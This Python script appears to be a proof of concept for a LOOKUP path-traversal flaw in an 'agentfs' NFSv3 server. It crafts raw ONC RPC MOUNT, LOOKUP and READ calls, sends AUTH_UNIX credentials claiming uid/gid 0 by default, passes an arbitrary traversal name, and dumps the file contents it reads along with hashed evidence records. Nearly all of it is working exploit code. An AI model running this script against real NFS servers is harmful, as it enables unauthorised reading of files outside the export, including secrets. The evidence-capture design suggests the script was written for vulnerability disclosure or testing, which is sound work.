#!/usr/bin/env python3
"""Capture raw ONC RPC/NFSv3 messages for an agentfs LOOKUP traversal PoC."""
import argparse
import base64
import datetime
import json
import socket
import struct
import sys
from pathlib import Path

XID = 0xC0FFEE01


class X:
    def __init__(self):
        self.b = bytearray()

    def u32(self, v):
        self.b += struct.pack(">I", v)
        return self

    def u64(self, v):
        self.b += struct.pack(">Q", v)
        return self

    def op(self, data):
        self.u32(len(data))
        self.b += data
        self.b += b"\x00" * ((-len(data)) % 4)
        return self

    def s(self, st):
        return self.op(st.encode())


class R:
    def __init__(self, b):
        self.b, self.o = b, 0

    def u32(self):
        v = struct.unpack_from(">I", self.b, self.o)[0]
        self.o += 4
        return v

    def u64(self):
        v = struct.unpack_from(">Q", self.b, self.o)[0]
        self.o += 8
        return v

    def op(self):
        n = self.u32()
        d = self.b[self.o:self.o + n]
        self.o += n + ((-n) % 4)
        return d

    def attrs(self):
        if not self.u32():
            return None
        a = {"type": self.u32(), "mode": self.u32(), "nlink": self.u32(),
             "uid": self.u32(), "gid": self.u32(), "size": self.u64(),
             "used": self.u64()}
        self.u32()
        self.u32()
        a["fsid"] = self.u64()
        a["fileid"] = self.u64()
        for k in ("atime", "mtime", "ctime"):
            a[k] = (self.u32(), self.u32())
        return a


def recv_exact(sock, n):
    out = b""
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError(f"connection closed after {len(out)}/{n} bytes")
        out += chunk
    return out


def recv_record(sock):
    raw = b""
    while True:
        hdr = recv_exact(sock, 4)
        first = struct.unpack(">I", hdr)[0]
        last = bool(first & 0x80000000)
        n = first & 0x7FFFFFFF
        payload = recv_exact(sock, n)
        raw += hdr + payload
        if last:
            return raw, payload


def rpc(host, port, prog, vers, proc, body, uid=0, gid=0):
    cred = X().u32(1).s("poc").u32(uid).u32(gid).u32(0)
    c = X().u32(XID).u32(0).u32(2).u32(prog).u32(vers).u32(proc)
    c.u32(1).op(bytes(cred.b)).u32(0).op(b"")
    msg = bytes(c.b) + bytes(body.b)
    req_record = struct.pack(">I", 0x80000000 | len(msg)) + msg

    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(req_record)
        resp_record, resp_payload = recv_record(s)

    r = R(resp_payload)
    if r.u32() != XID:
        raise SystemExit("XID mismatch")
    if r.u32() != 1:
        raise SystemExit("not an RPC reply")
    if r.u32() != 0:
        raise SystemExit("RPC denied")
    r.u32()
    r.op()
    if r.u32() != 0:
        raise SystemExit("RPC accept failed")
    return r, req_record, resp_record


def save(outdir, idx, label, req, resp):
    (outdir / f"{idx:02d}_{label}_request.record.bin").write_bytes(req)
    (outdir / f"{idx:02d}_{label}_response.record.bin").write_bytes(resp)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--name", required=True)
    ap.add_argument("--read", type=int, default=512)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--label", default="run")
    ap.add_argument("--uid", type=int, default=0)
    ap.add_argument("--gid", type=int, default=0)
    args = ap.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    started = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
    result = {"started_utc": started, "host": args.host, "port": args.port,
              "auth_unix_uid": args.uid, "auth_unix_gid": args.gid,
              "lookup_name": args.name, "read_count": args.read, "steps": []}

    r, req, resp = rpc(args.host, args.port, 100005, 3, 1, X().s("/"), args.uid, args.gid)
    save(outdir, 1, "mnt", req, resp)
    st = r.u32()
    root_fh = r.op()
    if st != 0:
        raise SystemExit(f"MNT failed status={st}")
    step = {"proc": "MNT", "status": st, "root_fh": root_fh.hex(),
            "request_sha256": __import__("hashlib").sha256(req).hexdigest(),
            "response_sha256": __import__("hashlib").sha256(resp).hexdigest()}
    result["steps"].append(step)
    print(f"[+] MNT / root fh={root_fh.hex()}")

    r, req, resp = rpc(args.host, args.port, 100003, 3, 3, X().op(root_fh).s(args.name), args.uid, args.gid)
    save(outdir, 2, "lookup", req, resp)
    st = r.u32()
    if st != 0:
        raise SystemExit(f"LOOKUP {args.name!r} failed status={st}")
    fh = r.op()
    obj = r.attrs()
    dir_attr = r.attrs()
    step = {"proc": "LOOKUP", "status": st, "name": args.name, "filehandle": fh.hex(),
            "object_attributes": obj, "dir_attributes": dir_attr,
            "request_sha256": __import__("hashlib").sha256(req).hexdigest(),
            "response_sha256": __import__("hashlib").sha256(resp).hexdigest()}
    result["steps"].append(step)
    print(f"[+] LOOKUP {args.name!r} -> fh={fh.hex()} size={obj['size'] if obj else '?'} mode={oct(obj['mode']) if obj else '?'}")

    r, req, resp = rpc(args.host, args.port, 100003, 3, 6, X().op(fh).u64(0).u32(args.read), args.uid, args.gid)
    save(outdir, 3, "read", req, resp)
    st = r.u32()
    if st != 0:
        step = {"proc": "READ", "status": st,
                "request_sha256": __import__("hashlib").sha256(req).hexdigest(),
                "response_sha256": __import__("hashlib").sha256(resp).hexdigest()}
        result["steps"].append(step)
        result["finished_utc"] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
        (outdir / "result.json").write_text(json.dumps(result, indent=2) + "\n")
        print(f"[!] READ failed status={st}")
        print(f"[+] raw evidence -> {outdir}")
        return
    file_attr = r.attrs()
    count = r.u32()
    eof = r.u32()
    data = r.op()
    step = {"proc": "READ", "status": st, "count": count, "eof": bool(eof),
            "data_utf8_preview": data.decode("utf-8", "replace"),
            "data_base64": base64.b64encode(data).decode(),
            "data_sha256": __import__("hashlib").sha256(data).hexdigest(),
            "file_attributes": file_attr,
            "request_sha256": __import__("hashlib").sha256(req).hexdigest(),
            "response_sha256": __import__("hashlib").sha256(resp).hexdigest()}
    result["steps"].append(step)
    result["finished_utc"] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
    (outdir / "result.json").write_text(json.dumps(result, indent=2) + "\n")
    print(f"[+] READ {count} bytes (eof={eof})")
    sys.stdout.buffer.write(data)
    print()
    print(f"[+] raw evidence -> {outdir}")


if __name__ == "__main__":
    main()
